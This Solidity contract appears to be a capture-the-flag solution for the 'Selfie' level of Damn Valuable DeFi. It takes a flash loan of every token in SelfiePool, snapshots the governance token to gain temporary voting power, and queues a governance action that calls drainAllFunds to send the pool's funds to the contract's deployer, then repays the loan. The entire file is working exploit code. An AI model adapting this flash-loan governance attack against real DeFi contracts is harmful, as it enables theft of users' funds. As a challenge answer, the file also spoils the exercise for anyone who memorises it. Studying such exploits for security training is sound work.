pragma solidity ^0.8.0;

import "../selfie/SimpleGovernance.sol";
import "../selfie/SelfiePool.sol";
import "../DamnValuableTokenSnapshot.sol";

contract SelfiExploiter {
    SimpleGovernance simpleGovernance;
    SelfiePool selfiePool;
    DamnValuableTokenSnapshot dvt;
    address owner;

    constructor(
        SimpleGovernance _simpleGovernance,
        SelfiePool _selfiePool,
        DamnValuableTokenSnapshot _dvt
    ) {
        simpleGovernance = _simpleGovernance;
        selfiePool = _selfiePool;
        dvt = _dvt;
        owner = msg.sender;
    }

    function exploit() public returns (uint256){
        uint256 tokensInPool = dvt.balanceOf(address(selfiePool));
        selfiePool.flashLoan(tokensInPool);
    }

    function receiveTokens(address dvtAddress, uint256 borrowAmount) external {
        dvt.snapshot();
        bytes memory callData = abi.encodeWithSignature(
            "drainAllFunds(address)",
            owner
        );
        simpleGovernance.queueAction(
            address(selfiePool),
            callData,
            0
        );
        dvt.transfer(address(selfiePool), borrowAmount);
    }
}
